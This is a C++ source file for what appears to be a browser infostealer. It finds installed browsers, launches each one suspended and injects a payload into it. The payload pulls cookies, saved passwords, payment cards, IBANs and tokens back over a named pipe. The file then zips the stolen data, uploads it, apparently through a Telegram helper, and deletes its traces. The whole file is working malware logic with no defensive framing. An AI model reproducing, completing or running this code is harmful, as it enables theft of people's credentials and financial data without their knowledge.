#include "../core/common.hpp"
#include "../core/console_silent.hpp"
#include "../core/telegram_utils.hpp"
#include "../sys/internal_api.hpp"
#include "browser_discovery.hpp"
#include "process_manager.hpp"
#include "pipe_server.hpp"
#include "injector.hpp"
using namespace Injector;
struct GlobalStats {
    int successful = 0;
    int failed = 0;
    int skipped = 0;
};
void ProcessBrowser(const BrowserInfo& browser, const std::filesystem::path& output, 
                    const Core::Console& console, GlobalStats& stats) {
    try {
        ProcessManager procMgr(browser);
        procMgr.CreateSuspended();
        PipeServer pipe(browser.type);
        pipe.Create();
        PayloadInjector injector(procMgr, console);
        injector.Inject(pipe.GetName());
        pipe.WaitForClient();
        pipe.SendConfig(output);
        pipe.ProcessMessages();
        auto pStats = pipe.GetStats();
        if (pStats.noAbe) {
            stats.skipped++;
        } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
            stats.successful++;
        } else {
            stats.failed++;
        }
        procMgr.Terminate();
    } catch (const std::exception& e) {
        stats.failed++;
    }
}
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    Core::Console mainConsole(false);
    if (!Sys::InitApi(false)) {
        return 1;
    }
    std::filesystem::path output = std::filesystem::temp_directory_path() / "tmp";
    std::filesystem::create_directories(output);
    GlobalStats stats;
    auto browsers = BrowserDiscovery::FindAll();
    if (browsers.empty()) {
        return 0;
    }
    for (const auto& browser : browsers) {
        ProcessBrowser(browser, output, mainConsole, stats);
    }
    auto zipPath = Core::CreateArchive(output);
    if (!zipPath.empty()) {
        Core::UploadData(zipPath);
        std::filesystem::remove(zipPath);
        Core::RemoveDirectory(output);
    }
    return 0;
}